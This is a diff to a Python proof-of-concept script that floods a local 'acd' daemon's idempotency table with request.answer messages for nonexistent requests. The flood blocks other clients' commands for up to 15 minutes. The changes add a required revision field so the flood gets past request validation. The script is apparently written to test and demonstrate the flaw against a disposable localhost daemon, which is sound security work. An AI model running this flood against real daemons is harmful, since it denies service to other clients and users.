@@ -21,8 +21,13 @@ control"): it also silently blocks every *other* paired client's and
 agent's `request.answer`/`ping` for up to 15 minutes, which is a new,
 cross-client denial of service, not just self-harm.
 
+acd/1 requires `revision` on `request.answer`; without it the daemon answers
+`bad_request` before it looks the request up. The requests here do not exist,
+so any revision reaches `RequestGone`; `--revision` sets the one sent.
+
 Usage:
-    python3 -I idem_table_flood.py --dir <acd config dir> --port <ws port>
+    python3 -I idem_table_flood.py --dir <acd config dir> --port <ws port> \
+        [--revision N]
 
 Safety: connects only to 127.0.0.1:<port>. Reads the client token from
 `<dir>/client.token`. Meant for a disposable test daemon -- it leaves the
@@ -44,6 +49,10 @@ def main():
     ap.add_argument("--fill", type=int, default=16384 + 100,
                      help="distinct command ids to send (default: table "
                           "capacity + a margin)")
+    ap.add_argument("--revision", type=int, default=1,
+                     help="revision sent on every request.answer; the request "
+                          "ids do not exist, so its value does not matter "
+                          "(default: 1)")
     args = ap.parse_args()
     token = open(os.path.join(args.dir, "client.token")).read().strip()
 
@@ -55,7 +64,8 @@ def main():
     victim.recv_json(timeout=5)
     victim.send_json({
         "id": "victim-0", "type": "request.answer",
-        "request_id": "victim-nonexistent-0", "option_id": "allow",
+        "request_id": "victim-nonexistent-0", "revision": args.revision,
+        "option_id": "allow",
     })
     r = victim.recv_json(timeout=5)
     print(f"  -> {r}")
@@ -76,6 +86,7 @@ def main():
             "id": cmd_id,
             "type": "request.answer",
             "request_id": f"nonexistent-{i}",
+            "revision": args.revision,
             "option_id": "allow",
         })
         reply = attacker.recv_json(timeout=5)
@@ -92,7 +103,8 @@ def main():
     fresh.recv_json(timeout=5)
     fresh.send_json({
         "id": "fresh-client-first-command", "type": "request.answer",
-        "request_id": "irrelevant", "option_id": "allow",
+        "request_id": "irrelevant", "revision": args.revision,
+        "option_id": "allow",
     })
     r = fresh.recv_json(timeout=5)
     print(f"  -> {r}")
